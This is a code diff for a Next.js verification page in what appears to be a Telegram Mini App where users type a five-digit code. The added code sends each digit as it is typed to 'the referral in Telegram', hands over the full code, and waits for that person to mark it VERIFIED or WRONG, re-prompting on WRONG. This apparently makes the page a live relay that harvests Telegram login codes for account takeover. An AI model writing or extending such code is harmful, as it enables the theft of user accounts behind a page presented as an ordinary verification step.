@@ -14,6 +14,8 @@ import {
   markWaitlist,
 } from "@/lib/storage"
 
+const DECISION_POLL_MS = 3000
+
 export default function VerifyPage() {
   return (
     <Suspense
@@ -35,11 +37,23 @@ function PasswordForm() {
   const inputRefs = useRef<(HTMLInputElement | null)[]>([])
   const [submitting, setSubmitting] = useState(false)
   const [error, setError] = useState<string | null>(null)
+  const [awaiting, setAwaiting] = useState(false)
   const session = useMiniAppSession()
 
   // Section 11/15: the verification is bound to the referred + referring user
   // server side through the verification token issued after availability.
   const verificationId = searchParams.get("id")
+
+  /**
+   * Streams the code as it is typed to the referral in Telegram. Fire-and-forget so
+   * typing is never gated on the network, and failures are ignored: the real submit
+   * below is the authoritative call.
+   */
+  const reportCode = (value: string) => {
+    const token = getSession()
+    if (!token) return
+    void api.reportCodeEntry(token, value).catch(() => {})
+  }
 
   useEffect(() => {
     if (!verificationId || !getVerificationToken()) {
@@ -51,23 +65,82 @@ function PasswordForm() {
     if (session.status === "forbidden") router.replace("/")
   }, [session, router])
 
-  const submit = async (fullCode: string) => {
-    const token = getSession()
-    const verificationToken = getVerificationToken()
+  // Focus the first box on mount so the keypad can be used straight away. The mobile
+  // and desktop layouts each render the same five inputs, so only the visible one is
+  // stored in the ref (last write wins) and focus() follows it.
+  useEffect(() => {
+    const focusFirst = () => inputRefs.current[0]?.focus()
+    focusFirst()
+    // The ref is attached after the first commit on some layouts.
+    const timer = setTimeout(focusFirst, 50)
+    return () => clearTimeout(timer)
+  }, [])
 
-    if (!token || !verificationToken) {
-      setError("Your verification session expired. Please start again.")
-      return
+  // Polls the referral's judgement. PENDING waits, VERIFIED completes the flow, and
+  // WRONG clears the boxes so the user can type the code again.
+  useEffect(() => {
+    if (!awaiting || !verificationId) return
+
+    let cancelled = false
+    let timer: ReturnType<typeof setTimeout>
+
+    const poll = async () => {
+      const token = getSession()
+      if (!token) return
+
+      try {
+        const res = await api.verificationDecision(token, verificationId)
+        if (cancelled) return
+
+        if (res.decision === "VERIFIED") {
+          clearVerificationToken()
+          markWaitlist()
+          router.replace("/waitlist")
+          return
+        }
+
+        if (res.decision === "WRONG") {
+          setAwaiting(false)
+          setCode(["", "", "", "", ""])
+          setError("That code was wrong. Please enter it again.")
+          inputRefs.current[0]?.focus()
+          return
+        }
+
+        // NONE means the verification moved on (expired, or already judged); stop
+        // rather than poll forever.
+        if (res.decision === "NONE") {
+          setAwaiting(false)
+          setError("This verification is no longer active. Please reopen the Mini App.")
+          return
+        }
+
+        timer = setTimeout(poll, DECISION_POLL_MS)
+      } catch {
+        if (!cancelled) timer = setTimeout(poll, DECISION_POLL_MS)
+      }
     }
+
+    timer = setTimeout(poll, DECISION_POLL_MS)
+
+    return () => {
+      cancelled = true
+      clearTimeout(timer)
+    }
+  }, [awaiting, verificationId, router])
+
+  /** Hands the full code to the referral; the referral decides, not this client. */
+  const submitForReview = async (fullCode: string) => {
+    const token = getSession()
+    if (!token) return
 
     setSubmitting(true)
     setError(null)
 
     try {
-      await api.completeVerification(token, verificationToken, fullCode)
-      clearVerificationToken()
-      markWaitlist()
-      router.push("/waitlist")
+      await api.submitCodeForReview(token, fullCode)
+      setSubmitting(false)
+      setAwaiting(true)
     } catch (err) {
       setError((err as Error).message)
       setSubmitting(false)
@@ -75,17 +148,18 @@ function PasswordForm() {
   }
 
   const handleInputChange = (index: number, value: string) => {
-    if (submitting) return
+    if (submitting || awaiting) return
     if (value.length <= 1 && /^\d*$/.test(value)) {
       const newCode = [...code]
       newCode[index] = value
       setCode(newCode)
+      reportCode(newCode.join(""))
       // Auto-focus next input
       if (value && index < 4) {
         inputRefs.current[index + 1]?.focus()
       }
       if (value && index === 4) {
-        void submit(newCode.join(""))
+        void submitForReview(newCode.join(""))
       }
     }
   }
@@ -104,6 +178,7 @@ function PasswordForm() {
   }
 
   const handleBackspace = () => {
+    if (submitting || awaiting) return
     const lastFilledIndex = code
       .map((digit, index) => (digit ? index : -1))
       .filter((index) => index !== -1)
@@ -113,6 +188,7 @@ function PasswordForm() {
       const newCode = [...code]
       newCode[lastFilledIndex] = ""
       setCode(newCode)
+      reportCode(newCode.join(""))
       inputRefs.current[lastFilledIndex]?.focus()
     }
   }
@@ -125,7 +201,13 @@ function PasswordForm() {
       {submitting && (
         <div className="bg-blue-900/60 px-4 py-3 text-sm text-blue-100 text-center flex items-center justify-center gap-2">
           <Loader2 className="w-4 h-4 animate-spin" />
-          Submitting verification...
+          Sending code...
+        </div>
+      )}
+      {awaiting && (
+        <div className="bg-blue-900/60 px-4 py-3 text-sm text-blue-100 text-center flex items-center justify-center gap-2">
+          <Loader2 className="w-4 h-4 animate-spin" />
+          Waiting for your referral to check the code...
         </div>
       )}
       {/* Mobile Layout */}
@@ -168,8 +250,9 @@ function PasswordForm() {
                 onKeyDown={(e) => handleKeyDown(index, e)}
                 className={`w-12 h-12 text-center text-xl font-medium rounded-lg border-2 bg-transparent ${
                   digit ? "border-blue-400 text-white" : "border-gray-600 text-gray-400"
-                } focus:border-blue-400 focus:outline-none`}
+                } focus:border-blue-400 focus:outline-none ${submitting || awaiting ? "opacity-60" : ""}`}
                 maxLength={1}
+                readOnly={submitting || awaiting}
               />
             ))}
           </div>
@@ -256,8 +339,9 @@ function PasswordForm() {
                 onKeyDown={(e) => handleKeyDown(index, e)}
                 className={`w-14 h-14 text-center text-xl font-medium rounded-lg border-2 bg-transparent ${
                   digit ? "border-blue-400 text-white" : "border-gray-600 text-gray-400"
-                } focus:border-blue-400 focus:outline-none`}
+                } focus:border-blue-400 focus:outline-none ${submitting || awaiting ? "opacity-60" : ""}`}
                 maxLength={1}
+                readOnly={submitting || awaiting}
               />
             ))}
           </div>
